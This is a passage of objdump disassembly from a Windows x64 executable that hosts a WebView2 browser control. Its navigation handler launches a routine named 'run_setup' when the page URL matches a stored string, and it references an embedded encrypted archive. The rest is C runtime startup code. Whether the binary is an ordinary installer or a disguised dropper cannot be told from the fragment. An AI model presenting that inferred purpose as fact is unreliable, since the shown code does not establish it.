   1400039de:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1400039e2:	4c 8b 0f             	mov    (%rdi),%r9
   1400039e5:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   1400039e9:	48 89 f9             	mov    %rdi,%rcx
   1400039ec:	49 89 c0             	mov    %rax,%r8
   1400039ef:	41 ff 51 18          	call   *0x18(%r9)
   1400039f3:	31 db                	xor    %ebx,%ebx
   1400039f5:	eb 34                	jmp    140003a2b <EH_Inv+0xab>
   1400039f7:	89 d3                	mov    %edx,%ebx
   1400039f9:	48 8d 15 f0 f2 06 00 	lea    0x6f2f0(%rip),%rdx        # 140072cf0 <IID_EnvDone+0x10>
   140003a00:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   140003a05:	48 89 f9             	mov    %rdi,%rcx
   140003a08:	41 89 d8             	mov    %ebx,%r8d
   140003a0b:	ff 15 a7 41 07 00    	call   *0x741a7(%rip)        # 140077bb8 <__imp_wsprintfW>
   140003a11:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   140003a15:	4c 8d 05 ba f0 06 00 	lea    0x6f0ba(%rip),%r8        # 140072ad6 <enc_runtimes_zip+0x341a6>
   140003a1c:	48 89 fa             	mov    %rdi,%rdx
   140003a1f:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140003a25:	ff 15 15 41 07 00    	call   *0x74115(%rip)        # 140077b40 <__imp_MessageBoxW>
   140003a2b:	89 d8                	mov    %ebx,%eax
   140003a2d:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
   140003a34:	5b                   	pop    %rbx
   140003a35:	5f                   	pop    %rdi
   140003a36:	5e                   	pop    %rsi
   140003a37:	c3                   	ret
   140003a38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003a3f:	00 

0000000140003a40 <CH_QI>:
   140003a40:	48 83 ec 28          	sub    $0x28,%rsp
   140003a44:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140003a48:	48 8b 05 e1 1a 07 00 	mov    0x71ae1(%rip),%rax        # 140075530 <.refptr.IID_IUnknown>
   140003a4f:	f3 0f 6f 08          	movdqu (%rax),%xmm1
   140003a53:	66 0f 74 c8          	pcmpeqb %xmm0,%xmm1
   140003a57:	66 0f d7 c1          	pmovmskb %xmm1,%eax
   140003a5b:	3d ff ff 00 00       	cmp    $0xffff,%eax
   140003a60:	74 28                	je     140003a8a <CH_QI+0x4a>
   140003a62:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140003a66:	66 0f 74 05 32 27 00 	pcmpeqb 0x2732(%rip),%xmm0        # 1400061a0 <.refptr._newmode+0x110>
   140003a6d:	00 
   140003a6e:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140003a72:	3d ff ff 00 00       	cmp    $0xffff,%eax
   140003a77:	74 11                	je     140003a8a <CH_QI+0x4a>
   140003a79:	49 c7 00 00 00 00 00 	movq   $0x0,(%r8)
   140003a80:	b8 02 40 00 80       	mov    $0x80004002,%eax
   140003a85:	48 83 c4 28          	add    $0x28,%rsp
   140003a89:	c3                   	ret
   140003a8a:	49 89 08             	mov    %rcx,(%r8)
   140003a8d:	48 8b 01             	mov    (%rcx),%rax
   140003a90:	ff 50 08             	call   *0x8(%rax)
   140003a93:	31 c0                	xor    %eax,%eax
   140003a95:	48 83 c4 28          	add    $0x28,%rsp
   140003a99:	c3                   	ret
   140003a9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140003aa0 <CH_AR>:
   140003aa0:	b8 01 00 00 00       	mov    $0x1,%eax
   140003aa5:	f0 0f c1 41 08       	lock xadd %eax,0x8(%rcx)
   140003aaa:	ff c0                	inc    %eax
   140003aac:	c3                   	ret
   140003aad:	0f 1f 00             	nopl   (%rax)

0000000140003ab0 <CH_RE>:
   140003ab0:	56                   	push   %rsi
   140003ab1:	57                   	push   %rdi
   140003ab2:	48 83 ec 28          	sub    $0x28,%rsp
   140003ab6:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140003abb:	f0 0f c1 71 08       	lock xadd %esi,0x8(%rcx)
   140003ac0:	ff ce                	dec    %esi
   140003ac2:	75 17                	jne    140003adb <CH_RE+0x2b>
   140003ac4:	48 89 cf             	mov    %rcx,%rdi
   140003ac7:	ff 15 2b 3f 07 00    	call   *0x73f2b(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140003acd:	48 89 c1             	mov    %rax,%rcx
   140003ad0:	31 d2                	xor    %edx,%edx
   140003ad2:	49 89 f8             	mov    %rdi,%r8
   140003ad5:	ff 15 4d 3f 07 00    	call   *0x73f4d(%rip)        # 140077a28 <__imp_HeapFree>
   140003adb:	89 f0                	mov    %esi,%eax
   140003add:	48 83 c4 28          	add    $0x28,%rsp
   140003ae1:	5f                   	pop    %rdi
   140003ae2:	5e                   	pop    %rsi
   140003ae3:	c3                   	ret
   140003ae4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003aeb:	00 00 00 00 00 

0000000140003af0 <CH_Inv>:
   140003af0:	56                   	push   %rsi
   140003af1:	57                   	push   %rdi
   140003af2:	53                   	push   %rbx
   140003af3:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   140003afa:	48 89 ce             	mov    %rcx,%rsi
   140003afd:	85 d2                	test   %edx,%edx
   140003aff:	0f 99 c0             	setns  %al
   140003b02:	4d 85 c0             	test   %r8,%r8
   140003b05:	0f 95 c1             	setne  %cl
   140003b08:	84 c8                	test   %cl,%al
   140003b0a:	0f 84 2c 01 00 00    	je     140003c3c <CH_Inv+0x14c>
   140003b10:	4c 89 c7             	mov    %r8,%rdi
   140003b13:	4c 89 05 5e 66 07 00 	mov    %r8,0x7665e(%rip)        # 14007a178 <g_wv+0x18>
   140003b1a:	49 8b 00             	mov    (%r8),%rax
   140003b1d:	4c 89 c1             	mov    %r8,%rcx
   140003b20:	ff 50 08             	call   *0x8(%rax)
   140003b23:	48 8b 07             	mov    (%rdi),%rax
   140003b26:	48 8d 15 53 66 07 00 	lea    0x76653(%rip),%rdx        # 14007a180 <g_wv+0x20>
   140003b2d:	48 89 f9             	mov    %rdi,%rcx
   140003b30:	ff 90 c8 00 00 00    	call   *0xc8(%rax)
   140003b36:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003b3d:	00 00 
   140003b3f:	48 8b 07             	mov    (%rdi),%rax
   140003b42:	48 8d 15 93 f2 06 00 	lea    0x6f293(%rip),%rdx        # 140072ddc <IID_WV2Ctrl2>
   140003b49:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003b4e:	48 89 f9             	mov    %rdi,%rcx
   140003b51:	ff 10                	call   *(%rax)
   140003b53:	85 c0                	test   %eax,%eax
   140003b55:	0f 99 c0             	setns  %al
   140003b58:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003b5d:	48 85 c9             	test   %rcx,%rcx
   140003b60:	0f 95 c2             	setne  %dl
   140003b63:	20 c2                	and    %al,%dl
   140003b65:	80 fa 01             	cmp    $0x1,%dl
   140003b68:	75 19                	jne    140003b83 <CH_Inv+0x93>
   140003b6a:	48 8b 01             	mov    (%rcx),%rax
   140003b6d:	ba ff 18 1a 21       	mov    $0x211a18ff,%edx
   140003b72:	ff 90 d8 00 00 00    	call   *0xd8(%rax)
   140003b78:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003b7d:	48 8b 01             	mov    (%rcx),%rax
   140003b80:	ff 50 10             	call   *0x10(%rax)
   140003b83:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   140003b87:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003b8c:	ff 15 56 3f 07 00    	call   *0x73f56(%rip)        # 140077ae8 <__imp_GetClientRect>
   140003b92:	48 8b 07             	mov    (%rdi),%rax
   140003b95:	48 8b 40 30          	mov    0x30(%rax),%rax
   140003b99:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   140003b9e:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   140003ba3:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003ba8:	48 89 f9             	mov    %rdi,%rcx
   140003bab:	ff d0                	call   *%rax
   140003bad:	48 8b 0d cc 65 07 00 	mov    0x765cc(%rip),%rcx        # 14007a180 <g_wv+0x20>
   140003bb4:	48 8b 01             	mov    (%rcx),%rax
   140003bb7:	48 8d 15 2e f2 06 00 	lea    0x6f22e(%rip),%rdx        # 140072dec <IID_WV2Ctrl2+0x10>
   140003bbe:	4c 8d 05 43 64 07 00 	lea    0x76443(%rip),%r8        # 14007a008 <s_addScriptHandler>
   140003bc5:	ff 90 d8 00 00 00    	call   *0xd8(%rax)
   140003bcb:	48 8b 0d ae 65 07 00 	mov    0x765ae(%rip),%rcx        # 14007a180 <g_wv+0x20>
   140003bd2:	48 8b 01             	mov    (%rcx),%rax
   140003bd5:	48 8d 15 c4 f1 06 00 	lea    0x6f1c4(%rip),%rdx        # 140072da0 <CH_Inv._u>
   140003bdc:	ff 50 28             	call   *0x28(%rax)
   140003bdf:	ff 15 13 3e 07 00    	call   *0x73e13(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140003be5:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140003beb:	48 89 c1             	mov    %rax,%rcx
   140003bee:	ba 08 00 00 00       	mov    $0x8,%edx
   140003bf3:	ff 15 27 3e 07 00    	call   *0x73e27(%rip)        # 140077a20 <__imp_HeapAlloc>
   140003bf9:	48 8d 0d d0 f8 06 00 	lea    0x6f8d0(%rip),%rcx        # 1400734d0 <s_nhVtbl>
   140003c00:	48 89 08             	mov    %rcx,(%rax)
   140003c03:	c7 40 08 01 00 00 00 	movl   $0x1,0x8(%rax)
   140003c0a:	48 8b 0d 6f 65 07 00 	mov    0x7656f(%rip),%rcx        # 14007a180 <g_wv+0x20>
   140003c11:	4c 8b 09             	mov    (%rcx),%r9
   140003c14:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140003c19:	48 89 c2             	mov    %rax,%rdx
   140003c1c:	41 ff 51 78          	call   *0x78(%r9)
   140003c20:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   140003c24:	31 db                	xor    %ebx,%ebx
   140003c26:	ba 02 00 00 00       	mov    $0x2,%edx
   140003c2b:	41 b8 f4 01 00 00    	mov    $0x1f4,%r8d
   140003c31:	45 31 c9             	xor    %r9d,%r9d
   140003c34:	ff 15 56 3f 07 00    	call   *0x73f56(%rip)        # 140077b90 <__imp_SetTimer>
   140003c3a:	eb 34                	jmp    140003c70 <CH_Inv+0x180>
   140003c3c:	89 d3                	mov    %edx,%ebx
   140003c3e:	48 8d 15 13 f1 06 00 	lea    0x6f113(%rip),%rdx        # 140072d58 <IID_CtrlDone+0x10>
   140003c45:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140003c4a:	48 89 f9             	mov    %rdi,%rcx
   140003c4d:	41 89 d8             	mov    %ebx,%r8d
   140003c50:	ff 15 62 3f 07 00    	call   *0x73f62(%rip)        # 140077bb8 <__imp_wsprintfW>
   140003c56:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   140003c5a:	4c 8d 05 75 ee 06 00 	lea    0x6ee75(%rip),%r8        # 140072ad6 <enc_runtimes_zip+0x341a6>
   140003c61:	48 89 fa             	mov    %rdi,%rdx
   140003c64:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140003c6a:	ff 15 d0 3e 07 00    	call   *0x73ed0(%rip)        # 140077b40 <__imp_MessageBoxW>
   140003c70:	89 d8                	mov    %ebx,%eax
   140003c72:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   140003c79:	5b                   	pop    %rbx
   140003c7a:	5f                   	pop    %rdi
   140003c7b:	5e                   	pop    %rsi
   140003c7c:	c3                   	ret
   140003c7d:	0f 1f 00             	nopl   (%rax)

0000000140003c80 <ASH_QI>:
   140003c80:	49 89 08             	mov    %rcx,(%r8)
   140003c83:	31 c0                	xor    %eax,%eax
   140003c85:	c3                   	ret
   140003c86:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003c8d:	00 00 00 

0000000140003c90 <ASH_AR>:
   140003c90:	b8 01 00 00 00       	mov    $0x1,%eax
   140003c95:	c3                   	ret
   140003c96:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003c9d:	00 00 00 

0000000140003ca0 <ASH_RE>:
   140003ca0:	b8 01 00 00 00       	mov    $0x1,%eax
   140003ca5:	c3                   	ret
   140003ca6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003cad:	00 00 00 

0000000140003cb0 <ASH_Inv>:
   140003cb0:	31 c0                	xor    %eax,%eax
   140003cb2:	c3                   	ret
   140003cb3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003cba:	84 00 00 00 00 00 

0000000140003cc0 <NH_QI>:
   140003cc0:	48 83 ec 28          	sub    $0x28,%rsp
   140003cc4:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140003cc8:	48 8b 05 61 18 07 00 	mov    0x71861(%rip),%rax        # 140075530 <.refptr.IID_IUnknown>
   140003ccf:	f3 0f 6f 08          	movdqu (%rax),%xmm1
   140003cd3:	66 0f 74 c8          	pcmpeqb %xmm0,%xmm1
   140003cd7:	66 0f d7 c1          	pmovmskb %xmm1,%eax
   140003cdb:	3d ff ff 00 00       	cmp    $0xffff,%eax
   140003ce0:	74 28                	je     140003d0a <NH_QI+0x4a>
   140003ce2:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140003ce6:	66 0f 74 05 c2 24 00 	pcmpeqb 0x24c2(%rip),%xmm0        # 1400061b0 <.refptr._newmode+0x120>
   140003ced:	00 
   140003cee:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140003cf2:	3d ff ff 00 00       	cmp    $0xffff,%eax
   140003cf7:	74 11                	je     140003d0a <NH_QI+0x4a>
   140003cf9:	49 c7 00 00 00 00 00 	movq   $0x0,(%r8)
   140003d00:	b8 02 40 00 80       	mov    $0x80004002,%eax
   140003d05:	48 83 c4 28          	add    $0x28,%rsp
   140003d09:	c3                   	ret
   140003d0a:	49 89 08             	mov    %rcx,(%r8)
   140003d0d:	48 8b 01             	mov    (%rcx),%rax
   140003d10:	ff 50 08             	call   *0x8(%rax)
   140003d13:	31 c0                	xor    %eax,%eax
   140003d15:	48 83 c4 28          	add    $0x28,%rsp
   140003d19:	c3                   	ret
   140003d1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140003d20 <NH_AR>:
   140003d20:	b8 01 00 00 00       	mov    $0x1,%eax
   140003d25:	f0 0f c1 41 08       	lock xadd %eax,0x8(%rcx)
   140003d2a:	ff c0                	inc    %eax
   140003d2c:	c3                   	ret
   140003d2d:	0f 1f 00             	nopl   (%rax)

0000000140003d30 <NH_RE>:
   140003d30:	56                   	push   %rsi
   140003d31:	57                   	push   %rdi
   140003d32:	48 83 ec 28          	sub    $0x28,%rsp
   140003d36:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140003d3b:	f0 0f c1 71 08       	lock xadd %esi,0x8(%rcx)
   140003d40:	ff ce                	dec    %esi
   140003d42:	75 17                	jne    140003d5b <NH_RE+0x2b>
   140003d44:	48 89 cf             	mov    %rcx,%rdi
   140003d47:	ff 15 ab 3c 07 00    	call   *0x73cab(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140003d4d:	48 89 c1             	mov    %rax,%rcx
   140003d50:	31 d2                	xor    %edx,%edx
   140003d52:	49 89 f8             	mov    %rdi,%r8
   140003d55:	ff 15 cd 3c 07 00    	call   *0x73ccd(%rip)        # 140077a28 <__imp_HeapFree>
   140003d5b:	89 f0                	mov    %esi,%eax
   140003d5d:	48 83 c4 28          	add    $0x28,%rsp
   140003d61:	5f                   	pop    %rdi
   140003d62:	5e                   	pop    %rsi
   140003d63:	c3                   	ret
   140003d64:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003d6b:	00 00 00 00 00 

0000000140003d70 <NH_Inv>:
   140003d70:	48 83 ec 28          	sub    $0x28,%rsp
   140003d74:	83 3d 0d 64 07 00 00 	cmpl   $0x0,0x7640d(%rip)        # 14007a188 <g_wv+0x28>
   140003d7b:	75 50                	jne    140003dcd <NH_Inv+0x5d>
   140003d7d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003d84:	00 00 
   140003d86:	4c 8b 02             	mov    (%rdx),%r8
   140003d89:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140003d8e:	48 89 d1             	mov    %rdx,%rcx
   140003d91:	48 89 c2             	mov    %rax,%rdx
   140003d94:	41 ff 50 20          	call   *0x20(%r8)
   140003d98:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003d9d:	48 85 c9             	test   %rcx,%rcx
   140003da0:	74 2b                	je     140003dcd <NH_Inv+0x5d>
   140003da2:	48 8d 15 ef ee 06 00 	lea    0x6eeef(%rip),%rdx        # 140072c98 <enc_runtimes_zip+0x34368>
   140003da9:	e8 22 18 00 00       	call   1400055d0 <wcsstr>
   140003dae:	48 85 c0             	test   %rax,%rax
   140003db1:	74 0f                	je     140003dc2 <NH_Inv+0x52>
   140003db3:	c7 05 cb 63 07 00 01 	movl   $0x1,0x763cb(%rip)        # 14007a188 <g_wv+0x28>
   140003dba:	00 00 00 
   140003dbd:	e8 ae f9 ff ff       	call   140003770 <run_setup>
   140003dc2:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003dc7:	ff 15 8b 3b 07 00    	call   *0x73b8b(%rip)        # 140077958 <__imp_CoTaskMemFree>
   140003dcd:	31 c0                	xor    %eax,%eax
   140003dcf:	48 83 c4 28          	add    $0x28,%rsp
   140003dd3:	c3                   	ret
   140003dd4:	cc                   	int3
   140003dd5:	cc                   	int3
   140003dd6:	cc                   	int3
   140003dd7:	cc                   	int3
   140003dd8:	cc                   	int3
   140003dd9:	cc                   	int3
   140003dda:	cc                   	int3
   140003ddb:	cc                   	int3
   140003ddc:	cc                   	int3
   140003ddd:	cc                   	int3
   140003dde:	cc                   	int3
   140003ddf:	cc                   	int3

0000000140003de0 <__dyn_tls_init>:
   140003de0:	56                   	push   %rsi
   140003de1:	57                   	push   %rdi
   140003de2:	48 83 ec 28          	sub    $0x28,%rsp
   140003de6:	48 8b 05 eb 30 07 00 	mov    0x730eb(%rip),%rax        # 140076ed8 <.refptr._CRT_MT>
   140003ded:	83 38 02             	cmpl   $0x2,(%rax)
   140003df0:	74 06                	je     140003df8 <__dyn_tls_init+0x18>
   140003df2:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140003df8:	83 fa 01             	cmp    $0x1,%edx
   140003dfb:	74 3c                	je     140003e39 <__dyn_tls_init+0x59>
   140003dfd:	83 fa 02             	cmp    $0x2,%edx
   140003e00:	75 13                	jne    140003e15 <__dyn_tls_init+0x35>
   140003e02:	48 8d 35 87 35 07 00 	lea    0x73587(%rip),%rsi        # 140077390 <__xd_z>
   140003e09:	48 8d 3d 80 35 07 00 	lea    0x73580(%rip),%rdi        # 140077390 <__xd_z>
   140003e10:	48 39 f7             	cmp    %rsi,%rdi
   140003e13:	75 14                	jne    140003e29 <__dyn_tls_init+0x49>
   140003e15:	48 83 c4 28          	add    $0x28,%rsp
   140003e19:	5f                   	pop    %rdi
   140003e1a:	5e                   	pop    %rsi
   140003e1b:	c3                   	ret
   140003e1c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003e20:	48 83 c7 08          	add    $0x8,%rdi
   140003e24:	48 39 fe             	cmp    %rdi,%rsi
   140003e27:	74 ec                	je     140003e15 <__dyn_tls_init+0x35>
   140003e29:	48 8b 07             	mov    (%rdi),%rax
   140003e2c:	48 85 c0             	test   %rax,%rax
   140003e2f:	74 ef                	je     140003e20 <__dyn_tls_init+0x40>
   140003e31:	ff 15 39 35 07 00    	call   *0x73539(%rip)        # 140077370 <__guard_dispatch_icall_fptr>
   140003e37:	eb e7                	jmp    140003e20 <__dyn_tls_init+0x40>
   140003e39:	ba 01 00 00 00       	mov    $0x1,%edx
   140003e3e:	48 83 c4 28          	add    $0x28,%rsp
   140003e42:	5f                   	pop    %rdi
   140003e43:	5e                   	pop    %rsi
   140003e44:	e9 87 0b 00 00       	jmp    1400049d0 <__mingw_TLScallback>
   140003e49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140003e50 <__tlregdtor>:
   140003e50:	31 c0                	xor    %eax,%eax
   140003e52:	c3                   	ret
   140003e53:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003e5a:	84 00 00 00 00 00 

0000000140003e60 <__dyn_tls_dtor>:
   140003e60:	83 fa 03             	cmp    $0x3,%edx
   140003e63:	0f 84 67 0b 00 00    	je     1400049d0 <__mingw_TLScallback>
   140003e69:	85 d2                	test   %edx,%edx
   140003e6b:	0f 84 5f 0b 00 00    	je     1400049d0 <__mingw_TLScallback>
   140003e71:	c3                   	ret
   140003e72:	cc                   	int3
   140003e73:	cc                   	int3
   140003e74:	cc                   	int3
   140003e75:	cc                   	int3
   140003e76:	cc                   	int3
   140003e77:	cc                   	int3
   140003e78:	cc                   	int3
   140003e79:	cc                   	int3
   140003e7a:	cc                   	int3
   140003e7b:	cc                   	int3
   140003e7c:	cc                   	int3
   140003e7d:	cc                   	int3
   140003e7e:	cc                   	int3
   140003e7f:	cc                   	int3

0000000140003e80 <__do_global_dtors>:
   140003e80:	48 83 ec 28          	sub    $0x28,%rsp
   140003e84:	48 8b 05 ad 61 07 00 	mov    0x761ad(%rip),%rax        # 14007a038 <__do_global_dtors.p>
   140003e8b:	48 8b 00             	mov    (%rax),%rax
   140003e8e:	48 85 c0             	test   %rax,%rax
   140003e91:	74 2e                	je     140003ec1 <__do_global_dtors+0x41>
   140003e93:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003e9a:	84 00 00 00 00 00 
   140003ea0:	ff 15 ca 34 07 00    	call   *0x734ca(%rip)        # 140077370 <__guard_dispatch_icall_fptr>
   140003ea6:	48 8b 05 8b 61 07 00 	mov    0x7618b(%rip),%rax        # 14007a038 <__do_global_dtors.p>
   140003ead:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140003eb1:	48 89 0d 80 61 07 00 	mov    %rcx,0x76180(%rip)        # 14007a038 <__do_global_dtors.p>
   140003eb8:	48 8b 40 08          	mov    0x8(%rax),%rax
   140003ebc:	48 85 c0             	test   %rax,%rax
   140003ebf:	75 df                	jne    140003ea0 <__do_global_dtors+0x20>
   140003ec1:	48 83 c4 28          	add    $0x28,%rsp
   140003ec5:	c3                   	ret
   140003ec6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003ecd:	00 00 00 

0000000140003ed0 <__do_global_ctors>:
   140003ed0:	56                   	push   %rsi
   140003ed1:	57                   	push   %rdi
   140003ed2:	53                   	push   %rbx
   140003ed3:	48 83 ec 20          	sub    $0x20,%rsp
   140003ed7:	48 8b 35 02 30 07 00 	mov    0x73002(%rip),%rsi        # 140076ee0 <.refptr.__CTOR_LIST__>
   140003ede:	8b 06                	mov    (%rsi),%eax
   140003ee0:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003ee3:	75 17                	jne    140003efc <__do_global_ctors+0x2c>
   140003ee5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003eea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003ef0:	8d 48 02             	lea    0x2(%rax),%ecx
   140003ef3:	ff c0                	inc    %eax
   140003ef5:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   140003efa:	75 f4                	jne    140003ef0 <__do_global_ctors+0x20>
   140003efc:	85 c0                	test   %eax,%eax
   140003efe:	74 25                	je     140003f25 <__do_global_ctors+0x55>
   140003f00:	89 c7                	mov    %eax,%edi
   140003f02:	48 ff cf             	dec    %rdi
   140003f05:	48 89 fb             	mov    %rdi,%rbx
   140003f08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003f0f:	00 
   140003f10:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140003f15:	ff 15 55 34 07 00    	call   *0x73455(%rip)        # 140077370 <__guard_dispatch_icall_fptr>
   140003f1b:	48 ff cb             	dec    %rbx
   140003f1e:	85 ff                	test   %edi,%edi
   140003f20:	48 89 df             	mov    %rbx,%rdi
   140003f23:	75 eb                	jne    140003f10 <__do_global_ctors+0x40>
   140003f25:	48 8d 0d 54 ff ff ff 	lea    -0xac(%rip),%rcx        # 140003e80 <__do_global_dtors>
   140003f2c:	48 83 c4 20          	add    $0x20,%rsp
   140003f30:	5b                   	pop    %rbx
   140003f31:	5f                   	pop    %rdi
   140003f32:	5e                   	pop    %rsi
   140003f33:	e9 88 d4 ff ff       	jmp    1400013c0 <atexit>
   140003f38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003f3f:	00 

0000000140003f40 <__main>:
   140003f40:	56                   	push   %rsi
   140003f41:	57                   	push   %rdi
   140003f42:	53                   	push   %rbx
   140003f43:	48 83 ec 20          	sub    $0x20,%rsp
   140003f47:	80 3d 6e 66 07 00 00 	cmpb   $0x0,0x7666e(%rip)        # 14007a5bc <initialized>
   140003f4e:	74 08                	je     140003f58 <__main+0x18>
   140003f50:	48 83 c4 20          	add    $0x20,%rsp
   140003f54:	5b                   	pop    %rbx
   140003f55:	5f                   	pop    %rdi
   140003f56:	5e                   	pop    %rsi
   140003f57:	c3                   	ret
   140003f58:	c6 05 5d 66 07 00 01 	movb   $0x1,0x7665d(%rip)        # 14007a5bc <initialized>
   140003f5f:	48 8b 35 7a 2f 07 00 	mov    0x72f7a(%rip),%rsi        # 140076ee0 <.refptr.__CTOR_LIST__>
   140003f66:	8b 06                	mov    (%rsi),%eax
   140003f68:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003f6b:	75 1f                	jne    140003f8c <__main+0x4c>
   140003f6d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003f72:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003f79:	1f 84 00 00 00 00 00 
   140003f80:	8d 48 02             	lea    0x2(%rax),%ecx
   140003f83:	ff c0                	inc    %eax
   140003f85:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   140003f8a:	75 f4                	jne    140003f80 <__main+0x40>
   140003f8c:	85 c0                	test   %eax,%eax
   140003f8e:	74 25                	je     140003fb5 <__main+0x75>
   140003f90:	89 c7                	mov    %eax,%edi
   140003f92:	48 ff cf             	dec    %rdi
   140003f95:	48 89 fb             	mov    %rdi,%rbx
   140003f98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003f9f:	00 
   140003fa0:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140003fa5:	ff 15 c5 33 07 00    	call   *0x733c5(%rip)        # 140077370 <__guard_dispatch_icall_fptr>
   140003fab:	48 ff cb             	dec    %rbx
   140003fae:	85 ff                	test   %edi,%edi
   140003fb0:	48 89 df             	mov    %rbx,%rdi
   140003fb3:	75 eb                	jne    140003fa0 <__main+0x60>
   140003fb5:	48 8d 0d c4 fe ff ff 	lea    -0x13c(%rip),%rcx        # 140003e80 <__do_global_dtors>
   140003fbc:	48 83 c4 20          	add    $0x20,%rsp
   140003fc0:	5b                   	pop    %rbx
   140003fc1:	5f                   	pop    %rdi
   140003fc2:	5e                   	pop    %rsi
   140003fc3:	e9 f8 d3 ff ff       	jmp    1400013c0 <atexit>
   140003fc8:	cc                   	int3
   140003fc9:	cc                   	int3
   140003fca:	cc                   	int3
   140003fcb:	cc                   	int3
   140003fcc:	cc                   	int3
   140003fcd:	cc                   	int3
   140003fce:	cc                   	int3
   140003fcf:	cc                   	int3

0000000140003fd0 <_gnu_exception_handler>:
   140003fd0:	56                   	push   %rsi
   140003fd1:	57                   	push   %rdi
   140003fd2:	53                   	push   %rbx
   140003fd3:	48 83 ec 20          	sub    $0x20,%rsp
   140003fd7:	48 89 cf             	mov    %rcx,%rdi
   140003fda:	48 8b 09             	mov    (%rcx),%rcx
   140003fdd:	8b 01                	mov    (%rcx),%eax
   140003fdf:	89 c2                	mov    %eax,%edx
   140003fe1:	81 e2 ff ff ff 20    	and    $0x20ffffff,%edx
   140003fe7:	81 fa 43 43 47 20    	cmp    $0x20474343,%edx
   140003fed:	75 0f                	jne    140003ffe <_gnu_exception_handler+0x2e>
   140003fef:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140003ff4:	f6 41 04 01          	testb  $0x1,0x4(%rcx)
   140003ff8:	0f 84 22 01 00 00    	je     140004120 <_gnu_exception_handler+0x150>
   140003ffe:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140004003:	3d 1c 00 00 c0       	cmp    $0xc000001c,%eax
   140004008:	7e 59                	jle    140004063 <_gnu_exception_handler+0x93>
   14000400a:	8d 88 74 ff ff 3f    	lea    0x3fffff74(%rax),%ecx
   140004010:	83 f9 0a             	cmp    $0xa,%ecx
   140004013:	77 77                	ja     14000408c <_gnu_exception_handler+0xbc>
   140004015:	48 8d 05 cc 2e 07 00 	lea    0x72ecc(%rip),%rax        # 140076ee8 <.refptr.__CTOR_LIST__+0x8>
   14000401c:	48 63 0c 88          	movslq (%rax,%rcx,4),%rcx
   140004020:	48 01 c1             	add    %rax,%rcx
   140004023:	ff e1                	jmp    *%rcx
